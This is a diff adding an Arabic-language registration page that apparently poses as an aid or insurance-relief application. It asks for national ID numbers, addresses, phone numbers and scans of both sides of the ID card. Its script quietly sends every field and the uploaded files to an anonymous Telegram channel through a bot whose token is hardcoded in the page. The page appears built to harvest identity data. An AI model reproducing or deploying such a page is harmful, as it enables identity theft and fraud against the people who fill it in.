@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>خُلقت لتعيش</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Tajawal', sans-serif;
+            background-color: #ffffff; /* تغيير الخلفية إلى اللون الأبيض */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            min-height: 100vh;
+            direction: rtl;
+            box-sizing: border-box;
+            padding: 20px;
+        }
+        .title {
+            text-align: center;
+            font-size: 28px;
+            font-weight: bold;
+            margin-top: 150px;
+            margin-bottom: 20px;
+            color: #800080; /* اللون البنفسجي */
+        }
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 600px;
+            margin: 20px auto;
+            box-sizing: border-box;
+        }
+        .info-box {
+            background-color: #ffe6e6;
+            border: 2px solid #ff4d4d;
+            border-radius: 5px;
+            padding: 15px;
+            margin-bottom: 20px;
+            color: #ff4d4d;
+            font-weight: bold;
+            font-size: 16px;
+            line-height: 1.5;
+            text-align: right;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            display: flex;
+            flex-direction: column;
+        }
+        label {
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        input[type="text"], input[type="number"], input[type="file"], input[type="email"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        input[type="file"] {
+            border: 2px dashed #ddd;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+        }
+        input[type="submit"] {
+            background-color: #6a1b9a; /* اللون البنفسجي */
+            color: white;
+            padding: 15px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        input[type="submit"]:hover {
+            background-color: #4a0072; /* ظل أغمق من اللون البنفسجي عند التمرير */
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: fixed;
+            top: 0;
+            width: 96%;
+            max-width: 600px;
+            background-color: #ffffff;
+            padding: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            z-index: 1000;
+        }
+        .header img {
+            max-width: 80px;
+            height: auto;
+            max-height: 80px;
+        }
+        .telegram-icon {
+            width: 25px; /* حجم أصغر للأيقونة */
+            height: auto;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <img src="https://i.ibb.co/3pFhCJ6/Nero-AI-image-denoiser-Nero-AI-Face.png" alt="Header Image">
+        <a href="https://t.me/HE0_ALL" target="_blank">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram" class="telegram-icon">
+        </a>
+    </div>
+    
+    <h1 class="title">تسجيل طلب</h1>
+
+    <div class="container">
+        <div class="info-box">
+            * قم بكتابة بيانات صحيحة ليتم الرد عليها.<br><br>
+            * في قسم الملفات: قم برفع/<br><br>
+            ١- صورة بطاقة الرقم القومي (وش وضهر).<br><br>
+            ٢- صورة تفيد بعدم وجود أي تأمين.<br><br>
+            # اجمعهم في ملف pdf وقم برفعه.<br><br>
+            * في العنوان: قم بكتابة العنوان بالتفصيل.
+        </div>
+        
+        <form id="userForm">
+            <div class="form-group">
+                <label for="name">الاسم الثلاثي:</label>
+                <input type="text" id="name" name="name" required>
+            </div>
+            <div class="form-group">
+                <label for="age">السن:</label>
+                <input type="number" id="age" name="age" required>
+            </div>
+            <div class="form-group">
+                <label for="id">الرقم القومي:</label>
+                <input type="text" id="id" name="id" required>
+            </div>
+            <div class="form-group">
+                <label for="province">المحافظة:</label>
+                <input type="text" id="province" name="province" required>
+            </div>
+            <div class="form-group">
+                <label for="address">العنوان:</label>
+                <input type="text" id="address" name="address" required>
+            </div>
+            <div class="form-group">
+                <label for="phone">رقم الهاتف:</label>
+                <input type="text" id="phone" name="phone" pattern="01[0-9]{9}" placeholder="يجب أن يبدأ بـ 01" required>
+            </div>
+            <div class="form-group">
+                <label for="email">البريد الإلكتروني (اختياري):</label>
+                <input type="email" id="email" name="email">
+            </div>
+            <div class="form-group">
+                <label for="file">رفع الملفات أو إسقاطها هنا:</label>
+                <input type="file" id="file" name="file" multiple required>
+            </div>
+            <input type="submit" value="إرسال">
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('userForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            // جمع البيانات
+            const formData = new FormData(this);
+            const token = '6457415810:AAEIWy76tjfslXmStkEcth_K_Hy4_Fyp7JM';
+            const channelId = '@soagsisnsjs'; // استبدل بالمعرف العام للقناة
+
+            // إرسال البيانات النصية
+            const message = `
+                الاسم الثلاثي: ${formData.get('name')}
+                السن: ${formData.get('age')}
+                الرقم القومي: ${formData.get('id')}
+                المحافظة: ${formData.get('province')}
+                العنوان: ${formData.get('address')}
+                رقم الهاتف: ${formData.get('phone')}
+                البريد الإلكتروني: ${formData.get('email') || 'غير متوفر'}
+            `;
+
+            // إرسال الرسالة النصية
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: channelId,
+                    text: message
+                })
+            }).then(response => {
+                if (response.ok) {
+                    // إرسال الملف
+                    const fileData = new FormData();
+                    fileData.append('chat_id', channelId);
+                    fileData.append('document', formData.get('file'));
+                    
+                    return fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
+                        method: 'POST',
+                        body: fileData
+                    });
+                } else {
+                    throw new Error('فشل في إرسال البيانات');
+                }
+            }).then(response => {
+                if (response.ok) {
+                    alert('تم تسجيل بياناتك بنجاح ✅\nسيتم التواصل معك بعد التأكد من البيانات⏳');
+                    window.location.href = 'https://t.me/HE0_ALL'; // تحويل المستخدم إلى القناة
+                    this.reset();
+                } else {
+                    throw new Error('فشل في إرسال الملف');
+                }
+            }).catch(error => {
+                alert('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
+            });
+        });
+    </script>
+
+</body>
+</html>
